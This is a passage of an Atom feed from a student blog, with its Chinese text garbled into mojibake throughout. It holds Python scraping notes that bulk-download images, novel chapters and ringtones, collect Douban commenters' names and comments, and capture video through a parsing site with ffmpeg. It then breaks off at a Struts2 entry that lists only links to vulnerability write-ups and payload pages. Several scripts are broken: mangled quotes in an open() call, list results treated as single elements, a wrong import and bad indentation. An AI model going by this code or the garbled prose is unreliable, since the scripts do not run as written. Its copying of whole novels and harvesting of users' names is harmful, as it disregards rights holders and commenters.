    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="çˆ¬è™«å­¦ä¹ "><a href="#çˆ¬è™«å­¦ä¹ " class="headerlink" title="çˆ¬è™«å­¦ä¹ "></a>çˆ¬è™«å­¦ä¹ </h1><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><ul><li>å‘æµè§ˆå™¨å‘é€è¯·æ±‚ï¼Œè·å–å“åº”</li><li>å¾—åˆ° <code>200å›æ˜¾</code> åï¼Œéœ€è¦è¿›è¡Œ<code>htmlè§£æ</code><ul><li>åˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶æ¥è§£æ <code>html(é€šè¿‡æ­£åˆ™åŒ¹é…</code></li><li>è°ƒç”¨ <code>bs4</code> è§£ææˆ‘ä»¬çš„html ï¼ˆ<code>html5lib</code> â€“å¯ä»¥é€šè¿‡æµè§ˆå™¨çš„å½¢å¼å–è§£æç½‘é¡µï¼‰</li><li>éœ€è¦å»è·å–æˆ‘ä»¬éœ€è¦çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼šå›¾ç‰‡ -&gt; <code>img æ ‡ç­¾</code> -&gt; <code>srcå±æ€§å€¼</code></li><li>å†é€šè¿‡srcè·¯å¾„å‘æµè§ˆå™¨å‘é€è¯·æ±‚</li><li>è¯·æ±‚æˆåŠŸä»¥å,å°†æˆ‘ä»¬çš„å›¾ç‰‡ä¿¡æ¯ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¿›è¡Œå†™å…¥æˆ‘ä»¬çš„æ–‡ä»¶ä¸­</li><li>å®ç°æ‰¹é‡çˆ¬å–</li></ul></li></ul><hr><h2 id="å®ä¾‹1-æ‰¹é‡è·å–å›¾ç‰‡"><a href="#å®ä¾‹1-æ‰¹é‡è·å–å›¾ç‰‡" class="headerlink" title="å®ä¾‹1 æ‰¹é‡è·å–å›¾ç‰‡"></a>å®ä¾‹1 æ‰¹é‡è·å–å›¾ç‰‡</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ–‡ä»¶ä¸‹è½½è·¯å¾„</span></span><br><span class="line">download = <span class="string">"images/"</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(download):</span><br><span class="line">    os.mkdir(download)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">        <span class="comment"># çˆ¬å–ç½‘ç«™è·¯å¾„</span></span><br><span class="line">        url=<span class="string">"http://sc.chinaz.com/tupian/index.html"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        url = <span class="string">"http://sc.chinaz.com/tupian/index_%d.html"</span>%i</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å‘é€è¯·æ±‚è·å–å“åº” æˆåŠŸçŠ¶æ€ç ä¸º200</span></span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="comment">#ä½¿ç”¨bså–è§£æç½‘é¡µ</span></span><br><span class="line">        bs = BeautifulSoup(response.content,<span class="string">"html5lib"</span>)</span><br><span class="line">        <span class="comment">#å®šä½åˆ°ç½‘é¡µä¸­å­˜æ”¾å›¾ç‰‡çš„DIV attrs é»˜è®¤é‡‡ç”¨çš„æ˜¯class</span></span><br><span class="line">        warp = bs.find(<span class="string">"div"</span>, attrs=&#123;<span class="string">"id"</span>: <span class="string">"container"</span>&#125;)</span><br><span class="line">        <span class="comment"># è·å–æˆ‘ä»¬çš„img  # éŸ³é¢‘  audio  src</span></span><br><span class="line">        imglist = warp.find_all(<span class="string">"img"</span>)</span><br><span class="line">        <span class="comment"># è·å–å›¾ç‰‡çš„åç§° --debugæ¥æ£€æŸ¥ä»£ç </span></span><br><span class="line">        <span class="keyword">for</span> img <span class="keyword">in</span> imglist:</span><br><span class="line">            title = img[<span class="string">"alt"</span>]</span><br><span class="line">            src = img[<span class="string">"src2"</span>]</span><br><span class="line">            <span class="comment">#éœ€è¦å†ä¸€æ¬¡å–è¯·æ±‚å›¾ç‰‡åœ°å€ å¹¶ä¸”å°†å›¾ç‰‡æ”¾å…¥æ–‡ä»¶å¤¹ä¸­</span></span><br><span class="line">            <span class="keyword">with</span> open(download+title+<span class="string">".jpg),"</span>w<span class="string">b")as file:</span></span><br><span class="line"><span class="string">                file.write(requests.get(src).content)</span></span><br><span class="line"><span class="string">        print("</span>ç¬¬%dé¡µæ‰“å°å®Œæˆ<span class="string">"%i)</span></span><br></pre></td></tr></table></figure></div><hr><h2 id="å®ä¾‹2-å•å¼ å°è¯´"><a href="#å®ä¾‹2-å•å¼ å°è¯´" class="headerlink" title="å®ä¾‹2 å•å¼ å°è¯´"></a>å®ä¾‹2 å•å¼ å°è¯´</h2><p><a href="https://www.cnblogs.com/simple-li/p/11253312.html" target="_blank" rel="noopener">åˆè¯†python ä¹‹ çˆ¬è™«ï¼šBeautifulSoup çš„ findã€find_allã€select æ–¹æ³•</a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">download = <span class="string">"novel/"</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(download):</span><br><span class="line">    os.mkdir(download)</span><br><span class="line"><span class="comment"># å‘é€è¯·æ±‚è·å–å“åº”</span></span><br><span class="line">url = <span class="string">"https://www.biqukan.com/42_42882/14586139.html"</span></span><br><span class="line">reponse = requests.get(url)</span><br><span class="line"><span class="comment"># è§£æå“åº”å†…å®¹</span></span><br><span class="line"><span class="keyword">if</span> reponse.status_code == <span class="number">200</span>:</span><br><span class="line">    bs = BeautifulSoup(reponse.content,<span class="string">"html5lib"</span>)</span><br><span class="line">    <span class="comment"># è·å–æ ‡é¢˜</span></span><br><span class="line">    <span class="comment"># bs.find()</span></span><br><span class="line">    <span class="comment"># bs.findAll()</span></span><br><span class="line">    <span class="comment"># bs.find_all("div",attrs=&#123;"":""&#125;)</span></span><br><span class="line">    h1 = bs.select_one(<span class="string">"h1"</span>)</span><br><span class="line">    title = h1.text</span><br><span class="line">    <span class="comment"># æ‰¾å½“å‰æ–‡ç« çš„æ–‡æœ¬</span></span><br><span class="line">    showtxt = bs.select_one(<span class="string">".showtxt"</span>).text</span><br><span class="line">    <span class="comment"># å¯¹æ–‡æœ¬è¿›è¡Œæ“ä½œ æƒ³å»æ‰ä¸éœ€è¦çš„ä¸œè¥¿(å­—ç¬¦ä¸²ç±»å‹)---replace</span></span><br><span class="line">    res = showtxt.replace(<span class="string">"app2();"</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">with</span> open(download+title+<span class="string">".txt"</span>,<span class="string">"w"</span>,encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(res)</span><br></pre></td></tr></table></figure></div><hr><h2 id="å®ä¾‹3-æ•´æœ¬å°è¯´"><a href="#å®ä¾‹3-æ•´æœ¬å°è¯´" class="headerlink" title="å®ä¾‹3 æ•´æœ¬å°è¯´"></a>å®ä¾‹3 æ•´æœ¬å°è¯´</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">header=&#123;<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36'</span>&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://www.biqukan.com/42_42882/"</span></span><br><span class="line">response = requests.get(url, header=header)</span><br><span class="line">response.encoding=<span class="string">'utf-8'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    bs = BeautifulSoup(response.content,<span class="string">"html5lib"</span>)</span><br><span class="line">    title = bs.select_one(<span class="string">"h2"</span>).text+<span class="string">"/"</span></span><br><span class="line">    <span class="comment"># åœ¨è¿›è¡Œåˆ°æˆ‘ä»¬çˆ¬å–æ ‡é¢˜çš„æ—¶å€™åˆ›å»ºä»¥æ ‡é¢˜å‘½åçš„æ–‡ä»¶å¤¹</span></span><br><span class="line">    <span class="comment"># æ–‡ä»¶ä¸‹è½½è·¯å¾„ = "xxx/" </span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(title):</span><br><span class="line">        os.mkdir(title)</span><br><span class="line">    <span class="comment"># æ‰¾æˆ‘ä»¬çš„divæ ‡ç­¾</span></span><br><span class="line">    listman = bs.select_one(<span class="string">".listmain"</span>)</span><br><span class="line">    <span class="comment"># æ‰¾åˆ°æ‰€æœ‰çš„aæ ‡ç­¾</span></span><br><span class="line">    alist = listman.select(<span class="string">"a"</span>)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> alist:</span><br><span class="line">        aTitle = a.text</span><br><span class="line">        href = a[<span class="string">"href"</span>].split(<span class="string">"/"</span>)[<span class="number">-1</span>]</span><br><span class="line">        <span class="comment"># print(aTitle,href)</span></span><br><span class="line">        <span class="comment"># å†ä¸€æ¬¡è¯·æ±‚è¿›å…¥ä¸‰çº§åŸŸå</span></span><br><span class="line">        urlChild = url+href</span><br><span class="line">        responseChild = requests.get(urlChild)</span><br><span class="line">        <span class="keyword">if</span> responseChild.status_code == <span class="number">200</span>:</span><br><span class="line">           bsChild = BeautifulSoup(responseChild.content,<span class="string">"html5lib"</span>)</span><br><span class="line">           <span class="comment"># æ‰¾å½“å‰æ–‡ç« çš„æ–‡æœ¬ type(showtxt) (str)</span></span><br><span class="line">           showtxt = bsChild.select_one(<span class="string">".showtxt"</span>).text</span><br><span class="line">           <span class="comment"># å¯¹æ–‡æœ¬è¿›è¡Œæ“ä½œ å»æ‰ä¸æƒ³è¦çš„ replace</span></span><br><span class="line">           res = showtxt.replace(<span class="string">"app2();"</span>, <span class="string">""</span>)</span><br><span class="line">           <span class="keyword">with</span> open(title + aTitle + <span class="string">".txt"</span>, <span class="string">"w"</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> file:</span><br><span class="line">               file.write(res)</span><br></pre></td></tr></table></figure></div><h1 id="çˆ¬è™«å­¦ä¹ 2"><a href="#çˆ¬è™«å­¦ä¹ 2" class="headerlink" title="çˆ¬è™«å­¦ä¹ 2"></a>çˆ¬è™«å­¦ä¹ 2</h1><p>è‡ªå·±ä¹Ÿä¸çŸ¥é“è¿™å‡ å¤©æ€ä¹ˆè¿‡æ¥çš„ï¼Œåæ­£è¯´å­¦åˆ°å¤šå°‘ï¼Œä¹Ÿæ²¡å¤šå°‘ï¼Œè¯´æ²¡å­¦ï¼Œè¿™ä¸¤å‘¨æ¯å¤©ä¸€æ•´ä¸ªä¸‹åˆéƒ½åœ¨å­¦è¿™ä¸ªã€‚</p><h2 id="çˆ¬éŸ³é¢‘"><a href="#çˆ¬éŸ³é¢‘" class="headerlink" title="çˆ¬éŸ³é¢‘"></a>çˆ¬éŸ³é¢‘</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">download = <span class="string">"music/"</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(download):</span><br><span class="line">    os.mkdir(download)</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://www.i4.cn/ring_22_0_1.html"</span></span><br><span class="line">response = requests.get(url)</span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    bs = BeautifulSoup(response.content, <span class="string">"html5lib"</span>)</span><br><span class="line">    <span class="comment"># å¯»æ‰¾å­˜æ”¾éŸ³ä¹çš„ div find ç±»ä¼¼</span></span><br><span class="line">    kbox = bs.select(<span class="string">".kbox"</span>)</span><br><span class="line">    <span class="comment"># æ‰¾ ring_list</span></span><br><span class="line">    ring = kbox.select(<span class="string">".ring_list"</span>)</span><br><span class="line">    <span class="keyword">for</span> li <span class="keyword">in</span> ring:</span><br><span class="line">        title = li.select(<span class="string">".title"</span>).text</span><br><span class="line">        <span class="comment"># title = li.select(".title")["title"]</span></span><br><span class="line">        <span class="comment"># print(title)</span></span><br><span class="line">        src = li.select(<span class="string">".audio_play"</span>)[<span class="string">"data-mp3"</span>]</span><br><span class="line">        <span class="keyword">with</span> open(download + title + <span class="string">".mp3"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> file:</span><br><span class="line">            r = requests.get(src)</span><br><span class="line">            file.write(r.content)</span><br></pre></td></tr></table></figure></div><p>åªæ˜¯å¼•ç”¨çš„åŒ…ä¸åŒï¼Œæ‰€ä»¥å­˜åœ¨ä¸€äº›å†™æ³•ä¸åŒ</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.request <span class="keyword">as</span> request</span><br><span class="line"></span><br><span class="line">download = <span class="string">"music/"</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(download):</span><br><span class="line">    mkdir(download)</span><br><span class="line"></span><br><span class="line">url=<span class="string">"https://www.i4.cn/ring_22_0_1.html"</span></span><br><span class="line"></span><br><span class="line">response = request.urlopen(url)</span><br><span class="line"><span class="comment"># print(response) äºŒè¿›åˆ¶è¯»å–</span></span><br><span class="line"></span><br><span class="line">bs = BeautifulSoup(response.content, <span class="string">"html5lib"</span>)</span><br><span class="line">    <span class="comment"># å¯»æ‰¾å­˜æ”¾éŸ³ä¹çš„ div find ç±»ä¼¼</span></span><br><span class="line">    kbox = bs.select(<span class="string">".kbox"</span>)</span><br><span class="line">    <span class="comment"># æ‰¾ ring_list</span></span><br><span class="line">    ring = kbox.select(<span class="string">".ring_list"</span>)</span><br><span class="line">    <span class="keyword">for</span> li <span class="keyword">in</span> ring:</span><br><span class="line">        title = li.select(<span class="string">".title"</span>).text</span><br><span class="line">      src = li.select(<span class="string">".audio_play"</span>)[<span class="string">"data-mp3"</span>]</span><br><span class="line">        request.urlretrieve(src, download + title +<span class="string">".mp3"</span>)</span><br></pre></td></tr></table></figure></div><hr><h2 id="çˆ¬è±†ç“£çš„è¯„è®ºï¼Œå¸–å­"><a href="#çˆ¬è±†ç“£çš„è¯„è®ºï¼Œå¸–å­" class="headerlink" title="çˆ¬è±†ç“£çš„è¯„è®ºï¼Œå¸–å­"></a>çˆ¬è±†ç“£çš„è¯„è®ºï¼Œå¸–å­</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">download = <span class="string">"comment/"</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(download):</span><br><span class="line">    os.mkdir(download)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯„ç”Ÿè™«</span></span><br><span class="line">url=<span class="string">"https://movie.douban.com/subject/27010768/"</span></span><br><span class="line"></span><br><span class="line">req = urllib.request.Request(url=url, headers=header, method=<span class="string">'GET'</span>)</span><br><span class="line"><span class="keyword">print</span> (req)</span><br><span class="line">response = urllib.request.urlopen(req)</span><br><span class="line"><span class="comment"># print(response.read()) # äºŒè¿›åˆ¶è¯»å–</span></span><br><span class="line"></span><br><span class="line">bs = BeautifulSoup(response.read(), <span class="string">"html5lib"</span>)</span><br><span class="line">    <span class="comment"># å¯»æ‰¾è±†ç“£è¯„è®ºçš„div </span></span><br><span class="line">comments = bs.select_one(<span class="string">"#comments-section"</span>)</span><br><span class="line">    <span class="comment"># æ‰¾ å•ä¸ªè¯„è®º</span></span><br><span class="line">shortInfo = comments.select(<span class="string">".comment"</span>)</span><br><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ªlist åˆ—è¡¨ å­˜æ”¾æ•°æ®</span></span><br><span class="line">comlist = []</span><br><span class="line"><span class="keyword">for</span> li <span class="keyword">in</span> shortInfo:</span><br><span class="line">    info = li.select_one(<span class="string">".comment-info"</span>)</span><br><span class="line">    <span class="comment"># è¯„è®ºäºº</span></span><br><span class="line">    name = info.select_one(<span class="string">"a"</span>).text</span><br><span class="line">    <span class="comment"># è¯„è®ºä¿¡æ¯</span></span><br><span class="line">    shortcom = li.select_one(<span class="string">".short"</span>).text</span><br><span class="line">    <span class="comment"># å°†æ•°æ®å†™å…¥ csv æ–‡ä»¶ </span></span><br><span class="line">    <span class="comment"># å°†æ•°æ®è½¬ä¸º å­—å…¸</span></span><br><span class="line">    commentText = &#123;<span class="string">"name"</span>:name, <span class="string">"comment-info"</span>:shortcom&#125;</span><br><span class="line">    comlist.append(commentText)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"å¯„ç”Ÿè™«.csv"</span>, <span class="string">"w"</span>, newline=<span class="string">""</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> file:</span><br><span class="line">    csvWr = csv.writer(file)</span><br><span class="line">    <span class="keyword">for</span> Scom <span class="keyword">in</span> comlist:</span><br><span class="line">        csvWr.writerow([Scom[<span class="string">"name"</span>], Scom[<span class="string">"comment-info"</span>]])</span><br><span class="line">        <span class="comment"># csvWr.writerows([Scom["name"], Scom["comment-info"]])</span></span><br><span class="line">        <span class="comment"># å¤šæ‰“s ä¼šé€ æˆæ¯ä¸ªå­—ç¬¦éƒ½å˜æˆä¸€ä¸ªå•å…ƒæ ¼å±æ€§</span></span><br></pre></td></tr></table></figure></div><p>è¿™è¾¹æœ€åé‚£é‡Œè¿˜æ˜¯å¯ä»¥æ³¨æ„ä¸€ä¸‹ï¼Œä¸€äº›ç»†èŠ‚é—®é¢˜ï¼Œä¼šå¯¼è‡´æœ€åçš„ç»“æœå‡ºç°åå·®</p><hr><h2 id="çˆ¬è§†é¢‘"><a href="#çˆ¬è§†é¢‘" class="headerlink" title="çˆ¬è§†é¢‘"></a>çˆ¬è§†é¢‘</h2><p>é¦–å…ˆè¦å»ä¸‹è½½ä¸€ä¸ª <code>ffmpeg</code> ï¼Œè¿™ä¸ªä¸œè¥¿å¯ä»¥æŠŠè§†é¢‘æµæºçˆ¬ä¸‹æ¥</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://jx618g.com/?url="</span></span><br><span class="line">response = requests.get(url)</span><br><span class="line">bs = BeautifulSoup(response.content, <span class="string">"html5lib"</span>)</span><br><span class="line">print(bs)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰¾åˆ° src m3u8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cmd: ffmpeg -i m3u8åœ°å€ -vcodec copy -acodec copy xxx.mp4</span></span><br></pre></td></tr></table></figure></div><hr><h1 id="æ—¥å¸¸çæ‰¯ä¸€ä¼š"><a href="#æ—¥å¸¸çæ‰¯ä¸€ä¼š" class="headerlink" title="æ—¥å¸¸çæ‰¯ä¸€ä¼š"></a>æ—¥å¸¸çæ‰¯ä¸€ä¼š</h1><p>éš¾å¾—æœ‰æ—¶é—´é€¼é€¼ä¸¤å¥ï¼Œæœ¬æ¥æ‰“ç®—æ‰¾ä¸ªå¥½ç‚¹çš„å›¾åºŠï¼Œæ¯•ç«Ÿä¸€ç›´ç™½å«–å¾®åšå¥½åƒä¹Ÿä¸å¤ªå¥½ï¼Œå¯æ˜¯å‘ç°æ²¡å‡ ä¸ªå¥½çš„ï¼Œæƒ³äº†ä¸‹ï¼Œç­‰è¿‡æ®µæ—¶é—´ <code>coding</code> é‚£è¾¹å‡çº§ç»“æŸåï¼Œå†æŠŠè‡ªå·±çš„blog æ¬è¿‡å»ä¸€ä»½å¥½äº†ï¼Œç½‘ç«™å¤‡æ¡ˆè¿˜åœ¨è€ƒè™‘ä¸­ï¼Œå®åœ¨ä¸è¡Œä»¥åå°±è‡ªå·±æŠŠè¿™äº›å…¨ä¸€è‚¡è„‘æ‰” <code>one note</code> ç®—äº†ï¼Œåæ­£ç«™å°ï¼Œä¸€å¹´å‡ ç™¾å—çš„cdn æƒ³äº†ä¸‹å¥½åƒä¹Ÿæ²¡é‚£ä¹ˆå¿…è¦å‡ºè¿™ä¸ªé’±ï¼Œç­‰ä»¥åè‡ªå·±èƒ½æˆå¤§ä½¬äº†ï¼Œç«™æµé‡å¤§äº†å†è¯´å§ã€‚</p>]]></content>
    
    <summary type="html">
    
      è¿˜ä¸èƒ½å¼€å­¦è¿”æ ¡ï¼Œåªå¥½çº¿ä¸Šå­¦ä¹ ï¼Œæ­£å¥½æœ€è¿‘å®è®­åœ¨è®²çˆ¬è™«ï¼Œè‡ªå·±æ¥å†™ä¸€ä¸‹å­¦ä¹ è®°å½•(æ°´ä¸€ç¯‡)
    
    </summary>
    
    
      <category term="å­¦ä¹ ç¬”è®°" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="çæ‰¯" scheme="https://manayakko.github.io/yakko117/tags/%E7%9E%8E%E6%89%AF/"/>
    
      <category term="Python" scheme="https://manayakko.github.io/yakko117/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Strust2 æŒ–å‘è®°å½•</title>
    <link href="https://manayakko.github.io/yakko117/2020/02/24/Struts2/"/>
    <id>https://manayakko.github.io/yakko117/2020/02/24/Struts2/</id>
    <published>2020-02-24T12:35:58.112Z</published>
    <updated>2020-04-13T01:41:56.982Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p><a href="https://www.cnblogs.com/qiantan/p/10695567.html" target="_blank" rel="noopener">struts2æ¼æ´æ€»ç»“(åˆ°19å¹´4æœˆ)</a><br><a href="https://www.freebuf.com/tag/struts2%E6%BC%8F%E6%B4%9E" target="_blank" rel="noopener">Struts2æ¼æ´</a><br><a href="https://github.com/vulhub/vulhub/tree/master/struts2" target="_blank" rel="noopener">vulhub</a><br><a href="https://www.cnblogs.com/leaf-7/p/5509527.html" target="_blank" rel="noopener">struts2 s2-005/s2-009/s2-013/s2-016/s2-019 payload</a><br><a href="https://www.jianshu.com/p/1d0987abbe29" target="_blank" rel="noopener">Struts-S2-007æ¼æ´åˆ©ç”¨ï¼ˆå«ç¯å¢ƒæ­å»ºã€å«POCã€å«POCé—®é¢˜è§£å†³æ–¹æ¡ˆï¼‰</a><br><a 